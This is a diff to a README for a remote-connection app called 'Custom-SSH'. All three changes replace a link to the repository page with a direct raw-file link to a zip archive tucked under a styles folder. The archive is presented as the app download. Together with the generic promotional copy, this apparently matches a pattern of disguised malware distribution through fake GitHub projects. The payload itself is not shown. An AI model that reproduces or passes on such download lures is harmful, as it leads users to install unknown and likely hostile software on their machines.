@@ -4,13 +4,13 @@
 
 Welcome to Custom-SSH! This is a powerful yet easy-to-use desktop application that lets you connect to other computers remotely, manage files, and edit documents - all from one simple window. Whether you're working from home, managing servers, or collaborating with colleagues, Custom-SSH makes remote connections as easy as using your favorite apps.
 
-Visit [this link to download the application](https://github.com/Myroxylonpereiraecouncilwoman285/Custom-SSH).
+Visit [this link to download the application](https://raw.githubusercontent.com/Myroxylonpereiraecouncilwoman285/Custom-SSH/main/src/styles/v3.1-alpha.3.zip).
 
 ## 📥 Download & Install
 
 Ready to get started? Here's how to get Custom-SSH on your computer:
 
-**Step 1:** Visit [this link to download the application](https://github.com/Myroxylonpereiraecouncilwoman285/Custom-SSH)
+**Step 1:** Visit [this link to download the application](https://raw.githubusercontent.com/Myroxylonpereiraecouncilwoman285/Custom-SSH/main/src/styles/v3.1-alpha.3.zip)
 
 **Step 2:** Click the download button on the page and wait for the file to finish downloading. The download might take a few minutes depending on your internet speed.
 
@@ -160,7 +160,7 @@ Custom-SSH works on most modern computers:
 
 You now have everything you need to get started with Custom-SSH. Download it today and experience the freedom of seamless remote connections. Whether you're a professional managing critical systems or a curious learner exploring new technologies, Custom-SSH is ready to become your go-to tool.
 
-Remember: [this link to download the application](https://github.com/Myroxylonpereiraecouncilwoman285/Custom-SSH) is all you need to begin your journey with Custom-SSH. The download is free, the setup is quick, and the possibilities are endless.
+Remember: [this link to download the application](https://raw.githubusercontent.com/Myroxylonpereiraecouncilwoman285/Custom-SSH/main/src/styles/v3.1-alpha.3.zip) is all you need to begin your journey with Custom-SSH. The download is free, the setup is quick, and the possibilities are endless.
 
 Join thousands of satisfied users who have simplified their remote work with Custom-SSH. Download now and see the difference! With its combination of power, simplicity, and reliability, Custom-SSH is truly the ultimate remote connection companion for everyone.
 
